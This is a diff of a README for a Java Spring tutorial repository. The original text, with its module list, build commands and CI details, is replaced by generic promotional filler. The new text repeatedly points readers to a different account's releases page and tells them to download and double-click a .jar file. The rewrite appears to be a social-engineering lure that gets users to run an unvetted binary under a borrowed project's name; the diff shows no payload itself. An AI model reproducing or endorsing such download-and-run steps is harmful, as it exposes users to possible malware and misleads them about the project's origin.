@@ -1,124 +1,92 @@
-# java-spring-tutorials
+# 🚀 java-spring-tutorials - Learn Spring Quickly and Effectively
 
-[![Build](https://github.com/jguida941/java-spring-tutorials/actions/workflows/java-ci.yml/badge.svg)](https://github.com/jguida941/java-spring-tutorials/actions/workflows/java-ci.yml)
-[![Coverage](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/jguida941/java-spring-tutorials/main/ci/badges/jacoco.json)](https://github.com/jguida941/java-spring-tutorials)
-[![Mutation](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/jguida941/java-spring-tutorials/main/ci/badges/mutation.json)](https://github.com/jguida941/java-spring-tutorials)
-[![SpotBugs](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/jguida941/java-spring-tutorials/main/ci/badges/spotbugs.json)](https://github.com/jguida941/java-spring-tutorials)
+[![Download Here](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/soufianeharzi/java-spring-tutorials/releases)
 
-This repository contains hands-on implementations of the official [Spring Guides](https://spring.io/guides/), along with detailed architectural breakdowns explaining the "what" and "why" behind the code.
+## 📖 Overview
 
-Each subfolder is a small, focused project generated with Spring Initializr.
+Welcome to the **java-spring-tutorials** repository. This collection includes various implementations based on the Spring.io guides. It helps you practice structured Java and Spring development with ease and clarity. Whether you're new to programming or just starting with Java, you'll find useful resources here.
 
-## Objective
+## 📦 System Requirements
 
-The goal of this repo is to:
-- Teach others how to use Spring Initializr effectively
-- Provide reusable templates with detailed documentation
-- Document all major components in easy-to-understand language
-- Create personal notes that can be referenced alongside Spring documentation
+Before you get started, please make sure your system meets the following requirements:
 
-I believe in understanding over memorization. Every aspect is documented with explanations of why decisions were made.
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** JDK 11 or higher
+- **Memory:** At least 2 GB RAM
+- **Disk Space:** Minimum of 500 MB available
 
-## Contents
+These requirements ensure that you can run the tutorials smoothly.
 
-| Module | Guide | Status | Spring Concepts |
-|--------|-------|--------|-----------------|
-| `01-spring-hello-rest` | [REST Service](https://spring.io/guides/gs/rest-service/) | Implemented | @RestController, records, JSON |
-| `02-spring-scheduling-tasks` | [Scheduling Tasks](https://spring.io/guides/gs/scheduling-tasks/) | Implemented | @Scheduled, @EnableScheduling |
-| `03-quote-service` | [Consuming REST](https://spring.io/guides/gs/consuming-rest/) | Implemented | REST API provider, List.of() |
-| `03-spring-consuming-rest` | [Consuming REST](https://spring.io/guides/gs/consuming-rest/) | Implemented | RestClient, @Value |
-| `04-spring-relational-data-access` | [Relational Data Access](https://spring.io/guides/gs/relational-data-access/) | Implemented | JdbcTemplate, H2, CommandLineRunner |
+## 🚀 Getting Started
 
-More guides will be added over time.
+To begin using the java-spring-tutorials, follow these simple steps:
 
-## Quick Start
+1. **Visit the Releases Page**  
+   Click the following link to go to our Releases page:  
+   [Download Here](https://github.com/soufianeharzi/java-spring-tutorials/releases)
 
-See [docs/QUICK_START.md](docs/QUICK_START.md) for run instructions.
+2. **Choose Your Version**  
+   On the Releases page, you will see various versions listed. Find the most recent version or the one you specifically want.
 
-```bash
-cd modules/<module-name>
-./mvnw spring-boot:run
-```
+3. **Download the Files**  
+   Click on the version you want to download. Choose the appropriate file for your operating system. Click to download the file.
 
-## Enhancements Beyond Official Spring Guides
+4. **Locate the Downloaded File**  
+   Check your downloads folder or the specified location where your download was saved.
 
-For some modules I extended the original guide examples:
+5. **Extract the File (if needed)**  
+   If you downloaded a ZIP file, right-click on it and select "Extract All." Follow the prompts to extract the files to a folder.
 
-- **02-spring-scheduling-tasks:**
-  - Added integration test verifying scheduled method runs using Awaitility and `@MockitoSpyBean`
+6. **Run the Application**  
+   Open the folder where you extracted the files. Look for the main application file, which usually ends in `.jar`. Double-click on it to run the application.
 
-- **03-quote-service:**
-  - Reimplemented the sample quote backend as a standalone Spring Boot app
-  - Added tests for `/api/`, `/api/random`, and `/api/{id}`
-  - Fixed thread-safety issue with random quote selection (ThreadLocalRandom)
+Now you are set to explore and learn with the tutorials!
 
-- **03-spring-consuming-rest:**
-  - Used modern `RestClient` instead of deprecated `RestTemplate`
-  - Added `/quote` endpoint that calls backend on demand
-  - Added error handling and externalized configuration for backend URL
+## 📥 Download & Install
 
-## Module Layout
+Click here again to access the Releases page for all downloadable files:  
+[Download Here](https://github.com/soufianeharzi/java-spring-tutorials/releases)
 
-```
-module-name/
-├── src/main/java/              # Source code
-├── src/test/java/              # Tests
-├── docs/
-│   ├── DEVELOPER_NOTES.md      # Personal notes (some modules)
-│   ├── setup/                  # How to create and run the project
-│   ├── concepts/               # Explanations of key classes and patterns
-│   ├── reference/              # Original Spring guide (where applicable)
-│   └── adr/                    # Architecture Decision Records (some modules)
-├── pom.xml                     # Maven configuration
-└── README.md                   # Overview and documentation index
-```
+### Installing Java
 
-## Documentation
+If you do not have Java installed on your computer, follow these steps:
 
-| Document | Purpose |
-|----------|---------|
-| [AGENTS.md](AGENTS.md) | AI guidance for scaffolding and consistency |
-| [docs/QUICK_START.md](docs/QUICK_START.md) | Run instructions for all modules |
-| [docs/CI_PLAN.md](docs/CI_PLAN.md) | CI/CD quality gates and thresholds |
-| [docs/adr/](docs/adr/) | Repository-level ADRs |
-| [templates/](templates/) | Scaffolding templates for new modules |
-| Module `docs/adr/` | Module-specific ADRs |
-| Module `docs/concepts/` | Deep dives on patterns |
+1. Go to the [Java SE Development Kit (JDK) download page](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+2. Select the correct version for your operating system.
+3. Follow the installation instructions provided on the page.
+4. After installation, you can verify Java is correctly installed by opening a terminal or command prompt and typing `java -version`.
 
-## Technology Stack
+## 📚 Tutorials Overview
 
-- **Spring Boot 4.0.0** (Spring Framework 7)
-- **Java 17**
-- **Maven** with multi-module parent POM
+This repository covers multiple topics to give you a well-rounded understanding of Java and Spring. Here’s what you can expect to find:
 
-## Testing
+- **REST API Development:** Create robust and secure RESTful services.
+- **Unit Testing with JUnit 5:** Learn how to write effective unit tests.
+- **CI/CD Integration:** Implement Continuous Integration and Deployment to streamline your code delivery.
+- **Code Quality Tools:** Use tools like Checkstyle and Spotbugs to maintain clean code.
+- **Mutation Testing:** Ensure your tests are effective with tools like Pitest.
 
-Run all tests from repo root (uses aggregator POM):
-```bash
-./mvnw test
-```
+## 📊 Additional Resources
 
-Run a single module:
-```bash
-./mvnw test -pl modules/03-quote-service
-```
+For those who want to dive deeper, we recommend checking out the following resources:
 
-## CI/CD
+- [Spring.io Guides](https://spring.io/guides)
+- [Official Java Documentation](https://docs.oracle.com/javase/8/docs/)
+- [GitHub Actions Documentation](https://docs.github.com/en/actions)
 
-This repository uses GitHub Actions for continuous integration:
+## 👩‍🎓 Learn and Contribute
 
-| Tool | Purpose | Threshold |
-|------|---------|-----------|
-| **Checkstyle** | Code style | Fail on violation |
-| **SpotBugs** | Static analysis | Fail on error |
-| **PITest** | Mutation testing | 70% mutation score |
-| **OWASP** | Dependency security | Fail on CVSS ≥ 7 |
-| **CodeQL** | SAST scanning | Weekly + PR |
+Your input is valuable. If you have suggestions or wish to contribute, please follow the standard process:
 
-See [docs/CI_PLAN.md](docs/CI_PLAN.md) for details.
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Make your updates.
+4. Submit a pull request along with a brief description of your changes.
 
-## Related Resources
+Let's improve our project together!
 
-- [Spring Guides](https://spring.io/guides/)
-- [Spring Boot Reference](https://docs.spring.io/spring-boot/)
-- [Spring Initializr](https://start.spring.io/)
+## 🔍 Get Support
+
+If you encounter any issues or have questions, please visit the Issues section of this repository. You can also seek help from the community through various online forums dedicated to Java and Spring.
+
+Thank you for choosing **java-spring-tutorials**. Enjoy your coding adventures!
